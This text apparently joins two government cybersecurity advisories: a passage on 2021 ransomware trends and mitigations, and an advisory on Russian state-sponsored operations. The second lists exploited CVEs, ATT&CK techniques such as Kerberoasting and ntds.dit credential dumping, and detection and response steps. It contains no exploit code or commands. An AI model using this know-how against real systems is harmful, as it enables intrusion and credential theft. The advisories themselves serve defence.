Gaining access to networks via phishing, stolen Remote Desktop Protocols (RDP) credentials or brute force, and exploiting vulnerabilities. Phishing emails, RDP exploitation, and exploitation of software vulnerabilities remained the top three initial infection vectors for ransomware incidents in 2021. Once a ransomware threat actor has gained code execution on a device or network access, they can deploy ransomware. Note: these infection vectors likely remain popular because of the increased use of remote work and schooling starting in 2020 and continuing through 2021. This increase expanded the remote attack surface and left network defenders struggling to keep pace with routine software patching.
Using cybercriminal services-for-hire. The market for ransomware became increasingly “professional” in 2021, and the criminal business model of ransomware is now well established. In addition to their increased use of ransomware-as-a-service (RaaS), ransomware threat actors employed independent services to negotiate payments, assist victims with making payments, and arbitrate payment disputes between themselves and other cyber criminals. NCSC-UK observed that some ransomware threat actors offered their victims the services of a 24/7 help center to expedite ransom payment and restoration of encrypted systems or data.

Note: cybersecurity authorities in the United States, Australia, and the United Kingdom assess that if the ransomware criminal business model continues to yield financial returns for ransomware actors, ransomware incidents will become more frequent. Every time a ransom is paid, it confirms the viability and financial attractiveness of the ransomware criminal business model. Additionally, cybersecurity authorities in the United States, Australia, and the United Kingdom note that the criminal business model often complicates attribution because there are complex networks of developers, affiliates, and freelancers; it is often difficult to identify conclusively the actors behind a ransomware incident.

Sharing victim information. Eurasian ransomware groups have shared victim information with each other, diversifying the threat to targeted organizations. For example, after announcing its shutdown, the BlackMatter ransomware group transferred its existing victims to infrastructure owned by another group, known as Lockbit 2.0. In October 2021, Conti ransomware actors began selling access to victims’ networks, enabling follow-on attacks by other cyber threat actors.
Shifting away from “big-game” hunting in the United States. 

In the first half of 2021, cybersecurity authorities in the United States and Australia observed ransomware threat actors targeting “big game” organizations—i.e., perceived high-value organizations and/or those that provide critical services—in several high-profile incidents. These victims included Colonial Pipeline Company, JBS Foods, and Kaseya Limited. However, ransomware groups suffered disruptions from U.S. authorities in mid-2021. Subsequently, the FBI observed some ransomware threat actors redirecting ransomware efforts away from “big-game” and toward mid-sized victims to reduce scrutiny. 
The ACSC observed ransomware continuing to target Australian organizations of all sizes, including critical services and “big game,” throughout 2021. 
NCSC-UK observed targeting of UK organizations of all sizes throughout the year, with some “big game” victims. Overall victims included businesses, charities, the legal profession, and public services in the Education, Local Government, and Health Sectors.


Diversifying approaches to extorting money. After encrypting victim networks, ransomware threat actors increasingly used “triple extortion” by threatening to (1) publicly release stolen sensitive information, (2) disrupt the victim’s internet access, and/or (3) inform the victim’s partners, shareholders, or suppliers about the incident. The ACSC continued to observe “double extortion” incidents in which a threat actor uses a combination of encryption and data theft to pressure victims to pay ransom demands. 

Ransomware groups have increased their impact by:

Targeting the cloud. Ransomware developers targeted cloud infrastructures to exploit known vulnerabilities in cloud applications, virtual machine software, and virtual machine orchestration software. Ransomware threat actors also targeted cloud accounts, cloud application programming interfaces (APIs), and data backup and storage systems to deny access to cloud resources and encrypt data. In addition to exploiting weaknesses to gain direct access, threat actors sometimes reach cloud storage systems by compromising local (on-premises) devices and moving laterally to the cloud systems. Ransomware threat actors have also targeted cloud service providers to encrypt large amounts of customer data.
Targeting managed service providers. Ransomware threat actors have targeted managed service providers (MSPs). MSPs have widespread and trusted accesses into client organizations. By compromising an MSP, a ransomware threat actor could access multiple victims through one initial compromise. Cybersecurity authorities in the United States, Australia, and the United Kingdom assess there will be an increase in ransomware incidents where threat actors target MSPs to reach their clients.
Attacking industrial processes. Although most ransomware incidents against critical infrastructure affect business information and technology systems, the FBI observed that several ransomware groups have developed code designed to stop critical infrastructure or industrial processes.
Attacking the software supply chain. Globally, in 2021, ransomware threat actors targeted software supply chain entities to subsequently compromise and extort their customers. Targeting software supply chains allows ransomware threat actors to increase the scale of their attacks by accessing multiple victims through a single initial compromise. 
Targeting organizations on holidays and weekends. The FBI and CISA observed cybercriminals conducting increasingly impactful attacks against U.S. entities on holidays and weekends throughout 2021. Ransomware threat actors may view holidays and weekends—when offices are normally closed—as attractive timeframes, as there are fewer network defenders and IT support personnel at victim organizations. For more information, see joint FBI-CISA Cybersecurity Advisory, Ransomware Awareness for Holidays and Weekends.


Mitigations

Cybersecurity authorities in the United States, Australia, and the United Kingdom recommend network defenders apply the following mitigations to reduce the likelihood and impact of ransomware incidents:

Keep all operating systems and software up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Regularly check for software updates and end of life (EOL) notifications, and prioritize patching known exploited vulnerabilities. In cloud environments, ensure that virtual machines, serverless applications, and third-party libraries are also patched regularly, as doing so is usually the customer’s responsibility. Automate software security scanning and testing when possible. Consider upgrading hardware and software, as necessary, to take advantage of vendor-provided virtualization and security capabilities.
If you use RDP or other potentially risky services, secure and monitor them closely.

Limit access to resources over internal networks, especially by restricting RDP and using virtual desktop infrastructure. After assessing risks, if RDP is deemed operationally necessary, restrict the originating sources and require MFA to mitigate credential theft and reuse. If RDP must be available externally, use a virtual private network (VPN), virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices. Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts to block brute force campaigns, log RDP login attempts, and disable unused remote access/RDP ports.
Ensure devices are properly configured and that security features are enabled. Disable ports and protocols that are not being used for a business purpose (e.g., RDP Transmission Control Protocol Port 3389). 
Restrict Server Message Block (SMB) Protocol within the network to only access servers that are necessary, and remove or disable outdated versions of SMB (i.e., SMB version 1). Threat actors use SMB to propagate malware across organizations.
Review the security posture of third-party vendors and those interconnected with your organization. Ensure all connections between third-party vendors and outside software or hardware are monitored and reviewed for suspicious activity.
Implement listing policies for applications and remote access that only allow systems to execute known and permitted programs under an established.
Open document readers in protected viewing modes to help prevent active content from running.


Implement a user training program and phishing exercises to raise awareness among users about the risks of visiting suspicious websites, clicking on suspicious links, and opening suspicious attachments. Reinforce the appropriate user response to phishing and spearphishing emails. 
Require MFA for as many services as possible—particularly for webmail, VPNs, accounts that access critical systems, and privileged accounts that manage backups. 
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to have strong, unique passwords. Passwords should not be reused across multiple accounts or stored on the system where an adversary may have access. Note: devices with local admin accounts should implement a password policy, possibly using a password management solution (e.g., Local Administrator Password Solution,LAPS,), that requires strong, unique passwords for each admin account.
If using Linux, use a Linux security module (such as SELinux, AppArmor, or SecComp) for defense in depth. The security modules may prevent the operating system from making arbitrary connections, which is an effective mitigation strategy against ransomware, as well as against remote code execution (RCE).
Protect cloud storage by backing up to multiple locations, requiring MFA for access, and encrypting data in the cloud. If using cloud-based key management for encryption, ensure that storage and key administration roles are separated.

Malicious cyber actors use system and network discovery techniques for network and system visibility and mapping. To limit an adversary’s ability to learn an organization’s enterprise environment and to move laterally, take the following actions: 

Segment networks. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. Organizations with an international footprint should be aware that connectivity between their overseas arms can expand their threat surface; these organizations should implement network segmentation between international divisions where appropriate. For example, the ACSC has observed ransomware and data theft incidents in which Australian divisions of multinational companies were impacted by ransomware incidents affecting assets maintained and hosted by offshore divisions (outside their control).
Implement end-to-end encryption. Deploying mutual Transport Layer Security (mTLS) can prevent eavesdropping on communications, which, in turn, can prevent cyber threat actors from gaining insights needed to advance a ransomware attack.
Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a network-monitoring tool. To aid in detecting the ransomware, leverage a tool that logs and reports all network traffic, including lateral movement on a network. Endpoint detection and response tools are particularly useful for detecting lateral connections as they have insight into unusual network connections for each host. Artificial intelligence (AI)-enabled network intrusion detection systems (NIDS) are also able to detect and block many anomalous behaviors associated with early stages of ransomware deployment.
Document external remote connections. Organizations should document approved solutions for remote management and maintenance. If an unapproved solution is installed on a workstation, the organization should investigate it immediately. These solutions have legitimate purposes, so they will not be flagged by antivirus vendors.
Implement time-based access for privileged accounts. For example, the just-in-time access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the zero trust model) by setting network-wide policy to automatically disable admin accounts at the Active Directory level. As needed, individual users can submit requests through an automated process that enables access to a system for a set timeframe. In cloud environments, just-in-time elevation is also appropriate and may be implemented using per-session federated claims or privileged access management tools.
Enforce principle of least privilege through authorization policies. Minimize unnecessary privileges for identities. Consider privileges assigned to human identities as well as non-person (e.g., software) identities. In cloud environments, non-person identities (service accounts or roles) with excessive privileges are a key vector for lateral movement and data access. Account privileges should be clearly defined, narrowly scoped, and regularly audited against usage patterns.
Reduce credential exposure. Accounts and their credentials present on hosts can enable further compromise of a network. Enforcing credential protection—by restricting where accounts and credentials can be used and by using local device credential protection features—reduces opportunities for threat actors to collect credentials for lateral movement and privilege escalation.
Disable unneeded command-line utilities; constrain scripting activities and permissions, and monitor their usage. Privilege escalation and lateral movement often depend on software utilities that run from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally. Organizations should also disable macros sent from external sources via Group Policy.
Maintain offline (i.e., physically disconnected) backups of data, and regularly test backup and restoration. These practices safeguard an organization’s continuity of operations or at least minimize potential downtime from an attack as well as protect against data losses. In cloud environments, consider leveraging native cloud service provider backup and restoration capabilities. To further secure cloud backups, consider separation of account roles to prevent an account that manages the backups from being used to deny or degrade the backups should the account become compromised. 
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure. Consider storing encryption keys outside the cloud. Cloud backups that are encrypted using a cloud key management service (KMS) could be affected should the cloud environment become compromised. 
Collect telemetry from cloud environments. Ensure that telemetry from cloud environments—including network telemetry (e.g., virtual private cloud,VPC, flow logs), identity telemetry (e.g., account sign-on, token usage, federation configuration changes), and application telemetry (e.g., file downloads, cross-organization sharing)—is retained and visible to the security team.

Note: critical infrastructure organizations with industrial control systems/operational technology networks should review joint CISA-FBI Cybersecurity Advisory DarkSide Ransomware: Best Practices for Preventing Business Disruption from Ransomware Attacks for more recommendations, including mitigations to reduce the risk of severe business or functional degradation should their entity fall victim to ransomware. 
Responding to Ransomware Attacks
If a ransomware incident occurs at your organization, cybersecurity authorities in the United States, Australia, and the United Kingdom recommend organizations:

Follow the Ransomware Response Checklist on p. 11 of the CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide.
Scan backups. If possible, scan backup data with an antivirus program to check that it is free of malware. This should be performed using an isolated, trusted system to avoid exposing backups to potential compromise.
Report incidents to respective cybersecurity authorities:

U.S. organizations should report incidents immediately to the FBI at a local FBI Field Office, CISA at us-cert.cisa.gov/report, or the U.S. Secret Service at a U.S. Secret Service Field Office. 
Australian organizations should report incidents to the ASD’s ACSC via cyber.gov.au or call 1300 292 371 (1300 CYBER 1).
UK organizations should report incidents to NCSC-UK via report.ncsc.gov.uk and/or Action Fraud, the United Kingdom’s fraud and cyber reporting centre, via actionfraud.police.uk.


Apply incident response best practices found in the joint Cybersecurity Advisory, Technical Approaches to Uncovering and Remediating Malicious Activity, developed by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom.

Note: cybersecurity authorities in the United States, Australia, and the United Kingdom strongly discourage paying a ransom to criminal actors. Criminal activity is motivated by financial gain, so paying a ransom may embolden adversaries to target additional organizations (or re-target the same organization) or encourage cyber criminals to engage in the distribution of ransomware. Paying the ransom also does not guarantee that a victim’s files will be recovered. Additionally, reducing the financial gain of ransomware threat actors will help disrupt the ransomware criminal business model.
Additionally, NCSC-UK reminds UK organizations that paying criminals is not condoned by the UK Government. In instances where a ransom paid, victim organizations often cease engagement with authorities, who then lose visibility of the payments made. While it continues to prove challenging, the NCSC-UK has supported UK Government efforts by identifying needed policy changes—including measures about the cyber insurance industry and ransom payments—that could reduce the threat of ransomware. 
Resources

For more information and resources on protecting against and responding to ransomware, refer to StopRansomware.gov, a centralized, U.S. whole-of-government webpage providing ransomware resources and alerts.
CISA’s Ransomware Readiness Assessment is a no-cost self-assessment based on a tiered set of practices to help organizations better assess how well they are equipped to defend and recover from a ransomware incident.
CISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats, including ransomware. By requesting these services, organizations of any size could find ways to reduce their risk and mitigate attack vectors.
The U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S. critical infrastructure. See the RFJ website for more information and how to report information securely.
The ACSC recommends organizations implement eight essential mitigation strategies from the ACSC’s Strategies to Mitigate Cyber Security Incidents as a cybersecurity baseline. These strategies, known as the “Essential Eight,” make it much harder for adversaries to compromise systems.
Refer to the ACSC’s practical guides on how to protect yourself against ransomware attacks and what to do if you are held to ransom at cyber.gov.au.
Refer to NCSC-UK’s guides on how to protect yourself against ransomware attacks and how to respond to and recover from them at ncsc.gov.uk/ransomware/home. 

Disclaimer
The information in this report is being provided “as is” for informational purposes only. The FBI, CISA, NSA, ACSC, and NCSC-UK do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation.

References,1, United States Federal Bureau of Investigation,2, United States Cybersecurity and Infrastructure Security Agency,3, United States National Security Agency,4, Australian Cyber Security Centre,5, United Kingdom National Cyber Security Centre

Revisions

February 9, 2022: Initial Version|February 10, 2022: Replaced PDF with 508 compliant PDF






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-040a
57,"




Summary

Actions Critical Infrastructure Organizations Should Implement to Immediately Strengthen Their Cyber Posture.
• Patch all systems. Prioritize patching known exploited vulnerabilities.
• Implement multi-factor authentication.
• Use antivirus software.
• Develop internal contact lists and surge support.
Note: this advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, version 10. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
This joint Cybersecurity Advisory (CSA)—authored by the Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), and National Security Agency (NSA)—is part of our continuing cybersecurity mission to warn organizations of cyber threats and help the cybersecurity community reduce the risk presented by these threats. This CSA provides an overview of Russian state-sponsored cyber operations; commonly observed tactics, techniques, and procedures (TTPs); detection actions; incident response guidance; and mitigations. This overview is intended to help the cybersecurity community reduce the risk presented by these threats.
CISA, the FBI, and NSA encourage the cybersecurity community—especially critical infrastructure network defenders—to adopt a heightened state of awareness and to conduct proactive threat hunting, as outlined in the Detection section. Additionally, CISA, the FBI, and NSA strongly urge network defenders to implement the recommendations listed below and detailed in the Mitigations section. These mitigations will help organizations improve their functional resilience by reducing the risk of compromise or severe business degradation.

Be prepared. Confirm reporting processes and minimize personnel gaps in IT/OT security coverage. Create, maintain, and exercise a cyber incident response plan, resilience plan, and continuity of operations plan so that critical functions and operations can be kept running if technology systems are disrupted or need to be taken offline.
Enhance your organization’s cyber posture. Follow best practices for identity and access management, protective controls and architecture, and vulnerability and configuration management.
Increase organizational vigilance. Stay current on reporting on this threat. Subscribe to CISA’s mailing list and feeds to receive notifications when CISA releases information about a security topic or threat.

CISA, the FBI, and NSA encourage critical infrastructure organization leaders to review CISA Insights: Preparing for and Mitigating Cyber Threats for information on reducing cyber threats to their organization.
Click here for a PDF version of this report.

Technical Details

Historically, Russian state-sponsored advanced persistent threat (APT) actors have used common but effective tactics—including spearphishing, brute force, and exploiting known vulnerabilities against accounts and networks with weak security—to gain initial access to target networks. Vulnerabilities known to be exploited by Russian state-sponsored APT actors for initial access include:

CVE-2018-13379 FortiGate VPNs
CVE-2019-1653 Cisco router
CVE-2019-2725 Oracle WebLogic Server
CVE-2019-7609 Kibana
CVE-2019-9670 Zimbra software
CVE-2019-10149 Exim Simple Mail Transfer Protocol
CVE-2019-11510 Pulse Secure
CVE-2019-19781 Citrix
CVE-2020-0688 Microsoft Exchange
CVE-2020-4006 VMWare (note: this was a zero-day at time.)
CVE-2020-5902 F5 Big-IP
CVE-2020-14882 Oracle WebLogic
CVE-2021-26855 Microsoft Exchange (Note: this vulnerability is frequently observed used in conjunction with CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065)

Russian state-sponsored APT actors have also demonstrated sophisticated tradecraft and cyber capabilities by compromising third-party infrastructure, compromising third-party software, or developing and deploying custom malware. The actors have also demonstrated the ability to maintain persistent, undetected, long-term access in compromised environments—including cloud environments—by using legitimate credentials.
In some cases, Russian state-sponsored cyber operations against critical infrastructure organizations have specifically targeted operational technology (OT)/industrial control systems (ICS) networks with destructive malware. See the following advisories and alerts for information on historical Russian state-sponsored cyber-intrusion campaigns and customized malware that have targeted ICS:

ICS Advisory ICS Focused Malware – Havex
ICS Alert Ongoing Sophisticated Malware Campaign Compromising ICS (Update E)
ICS Alert Cyber-Attack Against Ukrainian Critical Infrastructure
Technical Alert CrashOverride Malware
CISA MAR HatMan: Safety System Targeted Malware (Update B)
CISA ICS Advisory Schneider Electric Triconex Tricon (Update B)

Russian state-sponsored APT actors have used sophisticated cyber capabilities to target a variety of U.S. and international critical infrastructure organizations, including those in the Defense Industrial Base as well as the Healthcare and Public Health, Energy, Telecommunications, and Government Facilities Sectors. High-profile cyber activity publicly attributed to Russian state-sponsored APT actors by U.S. government reporting and legal actions includes:

Russian state-sponsored APT actors targeting state, local, tribal, and territorial (SLTT) governments and aviation networks, September 2020, through at least December 2020. Russian state-sponsored APT actors targeted dozens of SLTT government and aviation networks. The actors successfully compromised networks and exfiltrated data from multiple victims.
Russian state-sponsored APT actors’ global Energy Sector intrusion campaign, 2011 to 2018. These Russian state-sponsored APT actors conducted a multi-stage intrusion campaign in which they gained remote access to U.S. and international Energy Sector networks, deployed ICS-focused malware, and collected and exfiltrated enterprise and ICS-related data.
Russian state-sponsored APT actors’ campaign against Ukrainian critical infrastructure, 2015 and 2016. Russian state-sponsored APT actors conducted a cyberattack against Ukrainian energy distribution companies, leading to multiple companies experiencing unplanned power outages in December 2015. The actors deployed BlackEnergy malware to steal user credentials and used its destructive malware component, KillDisk, to make infected computers inoperable. In 2016, these actors conducted a cyber-intrusion campaign against a Ukrainian electrical transmission company and deployed CrashOverride malware specifically designed to attack power grids.

For more information on recent and historical Russian state-sponsored malicious cyber activity, see the referenced products below or cisa.gov/Russia.

Joint FBI-DHS-CISA CSA Russian Foreign Intelligence Service (SVR) Cyber Operations: Trends and Best Practices for Network Defenders
Joint NSA-FBI-CISA CSA Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments
Joint FBI-CISA CSA Russian State-Sponsored Advanced Persistent Threat Actor Compromises U.S. Government Targets
Joint CISA-FBI CSA APT Actors Chaining Vulnerabilities against SLTT, Critical Infrastructure, and Elections Organizations
CISA’s webpage Remediating Networks Affected by the SolarWinds and Active Directory/M365 Compromise
CISA Alert Russian Government Cyber Activity Targeting Energy Sector and Other Critical Infrastructure Sectors
CISA ICS Alert: Cyber-Attack Against Ukrainian Critical Infrastructure

Table 1 provides common, publicly known TTPs employed by Russian state-sponsored APT actors, which map to the MITRE ATT&CK for Enterprise framework, version 10. Note: these lists are not intended to be all inclusive. Russian state-sponsored actors have modified their TTPs before based on public reporting.[1] Therefore, CISA, the FBI, and NSA anticipate the Russian state-sponsored actors may modify their TTPs as they deem necessary to reduce their risk of detection. 
Table 1: Common Tactics and Techniques Employed by Russian State-Sponsored APT Actors



Tactic
Technique
Procedure





Reconnaissance [TA0043]


Active Scanning: Vulnerability Scanning [T1595.002]




Russian state-sponsored APT actors have performed large-scale scans in an attempt to find vulnerable servers.




Phishing for Information [T1598]


Russian state-sponsored APT actors have conducted spearphishing campaigns to gain credentials of target networks.




Resource Development [TA0042]


Develop Capabilities: Malware [T1587.001]


Russian state-sponsored APT actors have developed and deployed malware, including ICS-focused destructive malware.




Initial Access [TA0001]


Exploit Public Facing Applications [T1190]


Russian state-sponsored APT actors use publicly known vulnerabilities, as well as zero-days, in internet-facing systems to gain access to networks.




Supply Chain Compromise: Compromise Software Supply Chain [T1195.002]


Russian state-sponsored APT actors have gained initial access to victim organizations by compromising trusted third-party software. Notable incidents include M.E.Doc accounting software and SolarWinds Orion.




Execution [TA0002]


Command and Scripting Interpreter: PowerShell [T1059.003] and Windows Command Shell [T1059.003]


Russian state-sponsored APT actors have used cmd.exe to execute commands on remote machines. They have also used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and to execute other commands.




Persistence [TA0003]


Valid Accounts [T1078]


Russian state-sponsored APT actors have used credentials of existing accounts to maintain persistent, long-term access to compromised networks.




Credential Access [TA0006]


Brute Force: Password Guessing [T1110.001] and Password Spraying [T1110.003]


Russian state-sponsored APT actors have conducted brute-force password guessing and password spraying campaigns.




OS Credential Dumping: NTDS [T1003.003]


Russian state-sponsored APT actors have exfiltrated credentials and exported copies of the Active Directory database ntds.dit.




Steal or Forge Kerberos Tickets: Kerberoasting [T1558.003]


Russian state-sponsored APT actors have performed “Kerberoasting,” whereby they obtained the Ticket Granting Service (TGS) Tickets for Active Directory Service Principal Names (SPN) for offline cracking.




Credentials from Password Stores [T1555]


Russian state-sponsored APT actors have used previously compromised account credentials to attempt to access Group Managed Service Account (gMSA) passwords.




Exploitation for Credential Access [T1212]


Russian state-sponsored APT actors have exploited Windows Netlogon vulnerability CVE-2020-1472 to obtain access to Windows Active Directory servers.




Unsecured Credentials: Private Keys [T1552.004]


Russian state-sponsored APT actors have obtained private encryption keys from the Active Directory Federation Services (ADFS) container to decrypt corresponding SAML signing certificates.




Command and Control [TA0011]


Proxy: Multi-hop Proxy [T1090.003]


Russian state-sponsored APT actors have used virtual private servers (VPSs) to route traffic to targets. The actors often use VPSs with IP addresses in the home country of the victim to hide activity among legitimate user traffic.




 
For additional enterprise TTPs used by Russian state-sponsored APT actors, see the ATT&CK for Enterprise pages on APT29, APT28, and the Sandworm Team, respectively. For information on ICS TTPs see the ATT&CK for ICS pages on the Sandworm Team, BlackEnergy 3 malware, CrashOveride malware, BlackEnergy’s KillDisk component, and NotPetya malware.
Detection
Given Russian state-sponsored APT actors demonstrated capability to maintain persistent, long-term access in compromised enterprise and cloud environments, CISA, the FBI, and NSA encourage all critical infrastructure organizations to:

Implement robust log collection and retention. Without a centralized log collection and monitoring capability, organizations have limited ability to investigate incidents or detect the threat actor behavior described in this advisory. Depending on the environment, examples include:

Native tools such as M365’s Sentinel. 
Third-party tools, such as Sparrow, Hawk, or CrowdStrike's Azure Reporting Tool (CRT), to review Microsoft cloud environments and to detect unusual activity, service principals, and application activity. Note: for guidance on using these and other detection tools, refer to CISA Alert Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments.




Look for behavioral evidence or network and host-based artifacts from known Russian state-sponsored TTPs. See table 1 for commonly observed TTPs. 

To detect password spray activity, review authentication logs for system and application login failures of valid accounts. Look for multiple, failed authentication attempts across multiple accounts.
To detect use of compromised credentials in combination with a VPS, follow the below steps:

Look for suspicious “impossible logins,” such as logins with changing username, user agent strings, and IP address combinations or logins where IP addresses do not align to the expected user’s geographic location.
Look for one IP used for multiple accounts, excluding expected logins.
Look for “impossible travel.” Impossible travel occurs when a user logs in from multiple IP addresses that are a significant geographic distance apart (i.e., a person could not realistically travel between the geographic locations of the two IP addresses during the time period between the logins). Note: implementing this detection opportunity can result in false positives if legitimate users apply VPN solutions before connecting into networks.
Look for processes and program execution command-line arguments that may indicate credential dumping, especially attempts to access or copy the ntds.dit file from a domain controller. 
Look for suspicious privileged account use after resetting passwords or applying user account mitigations. 
Look for unusual activity in typically dormant accounts.
Look for unusual user agent strings, such as strings not typically associated with normal user activity, which may indicate bot activity.






For organizations with OT/ICS systems: 

Take note of unexpected equipment behavior; for example, unexpected reboots of digital controllers and other OT hardware and software. 
Record delays or disruptions in communication with field equipment or other OT devices. Determine if system parts or components are lagging or unresponsive.



Incident Response
Organizations detecting potential APT activity in their IT or OT networks should:

Immediately isolate affected systems. 
Secure backups. Ensure your backup data is offline and secure. If possible, scan your backup data with an antivirus program to ensure it is free of malware.
Collect and review relevant logs, data, and artifacts.
Consider soliciting support from a third-party IT organization to provide subject matter expertise, ensure the actor is eradicated from the network, and avoid residual issues that could enable follow-on exploitation.
Report incidents to CISA and/or the FBI via your local FBI field office or the FBI’s 24/7 CyWatch at (855) 292-3937 or CyWatch@fbi.gov.

Note: for OT assets, organizations should have a resilience plan that addresses how to operate if you lose access to—or control of—the IT and/or OT environment. Refer to the Mitigations section for more information.
See the joint advisory from Australia, Canada, New Zealand, the United Kingdom, and the United States on Technical Approaches to Uncovering and Remediating Malicious Activity for guidance on hunting or investigating a network, and for common mistakes in incident handling. CISA, the FBI, and NSA encourage critical infrastructure owners and operators to see CISA’s Federal Government Cybersecurity Incident and Vulnerability Response Playbooks. Although tailored to federal civilian branch agencies, these playbooks provide operational procedures for planning and conducting cybersecurity incident and vulnerability response activities and detail each step for both incident and vulnerability response.  
Note: organizations should document incident response procedures in a cyber incident response plan, which organizations should create and exercise (as noted in the Mitigations section). 

Mitigations

CISA, the FBI, and NSA encourage all organizations to implement the following recommendations to increase their cyber resilience against this threat.
Be Prepared
Confirm Reporting Processes and Minimize Coverage Gaps

Develop internal contact lists. Assign main points of contact for a suspected incident as well as roles and responsibilities and ensure personnel know how and when to report an incident.
Minimize gaps in IT/OT security personnel availability by identifying surge support for responding to an incident. Malicious cyber actors are known to target organizations on weekends and holidays when there are gaps in organizational cybersecurity—critical infrastructure organizations should proactively protect themselves by minimizing gaps in coverage.
Ensure IT/OT security personnel monitor key internal security capabilities and can identify anomalous behavior. Flag any identified IOCs and TTPs for immediate response. (See table 1 for commonly observed TTPs).

Create, Maintain, and Exercise a Cyber Incident Response, Resilience Plan, and Continuity of Operations Plan

Create, maintain, and exercise a cyber incident response and continuity of operations plan.
Ensure personnel are familiar with the key steps they need to take during an incident and are positioned to act in a calm and unified manner. Key questions:

Do personnel have the access they need?
Do they know the processes?


For OT assets/networks,

Identify a resilience plan that addresses how to operate if you lose access to—or control of—the IT and/or OT environment.

Identify OT and IT network interdependencies and develop workarounds or manual controls to ensure ICS networks can be isolated if the connections create risk to the safe and reliable operation of OT processes. Regularly test contingency plans, such as manual controls, so that safety critical functions can be maintained during a cyber incident. Ensure that the OT network can operate at necessary capacity even if the IT network is compromised.


Regularly test manual controls so that critical functions can be kept running if ICS or OT networks need to be taken offline.
Implement data backup procedures on both the IT and OT networks. Backup procedures should be conducted on a frequent, regular basis. Regularly test backup procedures and ensure that backups are isolated from network connections that could enable the spread of malware.
In addition to backing up data, develop recovery documents that include configuration settings for common devices and critical OT equipment. This can enable more efficient recovery following an incident.



Enhance your Organization’s Cyber Posture
CISA, the FBI, and NSA recommend organizations apply the best practices below for identity and access management, protective controls and architecture, and vulnerability and configuration management.
Identity and Access Management

Require multi-factor authentication for all users, without exception.
Require accounts to have strong passwords and do not allow passwords to be used across multiple accounts or stored on a system to which an adversary may have access.
Secure credentials. Russian state-sponsored APT actors have demonstrated their ability to maintain persistence using compromised credentials.

Use virtualizing solutions on modern hardware and software to ensure credentials are securely stored.
Disable the storage of clear text passwords in LSASS memory.
Consider disabling or limiting New Technology Local Area Network Manager (NTLM) and WDigest Authentication.
Implement Credential Guard for Windows 10 and Server 2016 (Refer to Microsoft: Manage Windows Defender Credential Guard for more information). For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA).
Minimize the Active Directory attack surface to reduce malicious ticket-granting activity. Malicious activity such as “Kerberoasting” takes advantage of Kerberos’ TGS and can be used to obtain hashed credentials that attackers attempt to crack.


Set a strong password policy for service accounts.
Audit Domain Controllers to log successful Kerberos TGS requests and ensure the events are monitored for anomalous activity.  

Secure accounts.
Enforce the principle of least privilege. Administrator accounts should have the minimum permission they need to do their tasks.
Ensure there are unique and distinct administrative accounts for each set of administrative tasks.
Create non-privileged accounts for privileged users and ensure they use the non- privileged accounts for all non-privileged access (e.g., web browsing, email access).



Protective Controls and Architecture

Identify, detect, and investigate abnormal activity that may indicate lateral movement by a threat actor or malware. Use network monitoring tools and host-based logs and monitoring tools, such as an endpoint detection and response (EDR) tool. EDR tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Enable strong spam filters.

Enable strong spam filters to prevent phishing emails from reaching end users.
Filter emails containing executable files to prevent them from reaching end users.
Implement a user training program to discourage users from visiting malicious websites or opening malicious attachments.



Note: CISA, the FBI, and NSA also recommend, as a longer-term effort, that critical infrastructure organizations implement network segmentation to separate network segments based on role and functionality. Network segmentation can help prevent lateral movement by controlling traffic flows between—and access to—various subnetworks.

Appropriately implement network segmentation between IT and OT networks. Network segmentation limits the ability of adversaries to pivot to the OT network even if the IT network is compromised. Define a demilitarized zone that eliminates unregulated communication between the IT and OT networks.
Organize OT assets into logical zones by taking into account criticality, consequence, and operational necessity. Define acceptable communication conduits between the zones and deploy security controls to filter network traffic and monitor communications between zones. Prohibit ICS protocols from traversing the IT network.

Vulnerability and Configuration Management

Update software, including operating systems, applications, and firmware on IT network assets, in a timely manner. Prioritize patching known exploited vulnerabilities, especially those CVEs identified in this CSA, and then critical and high vulnerabilities that allow for remote code execution or denial-of-service on internet-facing equipment.

Consider using a centralized patch management system. For OT networks, use a risk-based assessment strategy to determine the OT network assets and zones that should participate in the patch management program.  
Consider signing up for CISA’s cyber hygiene services, including vulnerability scanning, to help reduce exposure to threats. CISA’s vulnerability scanning service evaluates external network presence by executing continuous scans of public, static IP addresses for accessible services and vulnerabilities.


Use industry recommended antivirus programs.

Set antivirus/antimalware programs to conduct regular scans of IT network assets using up-to-date signatures.
Use a risk-based asset inventory strategy to determine how OT network assets are identified and evaluated for the presence of malware.


Implement rigorous configuration management programs. Ensure the programs can track and mitigate emerging threats. Review system configurations for misconfigurations and security weaknesses.
Disable all unnecessary ports and protocols

Review network security device logs and determine whether to shut off unnecessary ports and protocols. Monitor common ports and protocols for command and control  activity.
Turn off or disable any unnecessary services (e.g., PowerShell) or functionality within devices.


Ensure OT hardware is in read-only mode.

Increase Organizational Vigilance

